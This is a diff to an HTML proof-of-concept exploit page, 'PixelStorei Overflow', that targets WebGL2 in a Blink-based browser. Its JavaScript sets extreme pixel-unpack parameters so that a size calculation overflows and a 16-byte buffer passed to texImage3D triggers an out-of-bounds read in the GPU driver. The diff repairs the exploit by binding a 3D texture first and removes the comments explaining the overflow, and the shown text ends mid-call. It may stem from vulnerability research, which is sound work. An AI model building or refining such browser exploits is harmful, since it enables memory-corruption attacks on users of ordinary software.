@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>POC - PixelStorei Overflow</title>
+  <title>POC - PixelStorei Overflow (Fixed)</title>
 </head>
 <body>
   <h1>POC test 2 - Unpack State Overflow</h1>
@@ -10,15 +10,17 @@
     const canvas = document.createElement('canvas');
     const gl = canvas.getContext('webgl2');
     
+    // FIX: We must create and bind a 3D texture first!
+    const tex = gl.createTexture();
+    gl.bindTexture(gl.TEXTURE_3D, tex);
+    
     // Legal dimensions to pass Blink's MAX_3D_TEXTURE_SIZE check
     const width = 1024; 
     const height = 1024;
     const depth = 2;
     
     // Manipulate the Unpack state. 
-    // The GPU calculates: total_size = (UNPACK_IMAGE_HEIGHT * UNPACK_ROW_LENGTH * bytes_per_pixel) + ...
-    // We use massive numbers to cause a 32-bit integer overflow in the size calculation *after* dimension checks.
-    gl.pixelStorei(gl.UNPACK_ROW_LENGTH,   0x10000000); // 268 million pixels per row
+    gl.pixelStorei(gl.UNPACK_ROW_LENGTH,   0x10000000); 
     gl.pixelStorei(gl.UNPACK_IMAGE_HEIGHT, 0x10000000); 
     gl.pixelStorei(gl.UNPACK_SKIP_PIXELS,  0x08000000);
     gl.pixelStorei(gl.UNPACK_SKIP_ROWS,    0x08000000);
@@ -27,9 +29,7 @@
     const tinyBuffer = new Uint8Array(16);
 
     try {
-        // Send it to the GPU. 
-        // If the size calculation overflows back to a small number (e.g., 16), it will pass bounds checks.
-        // But the driver will attempt to read UNPACK_ROW_LENGTH bytes!
+        // Send it to the GPU.
         gl.texImage3D(
             gl.TEXTURE_3D, 0, gl.RGBA8, 
             width, height, depth, 0, 
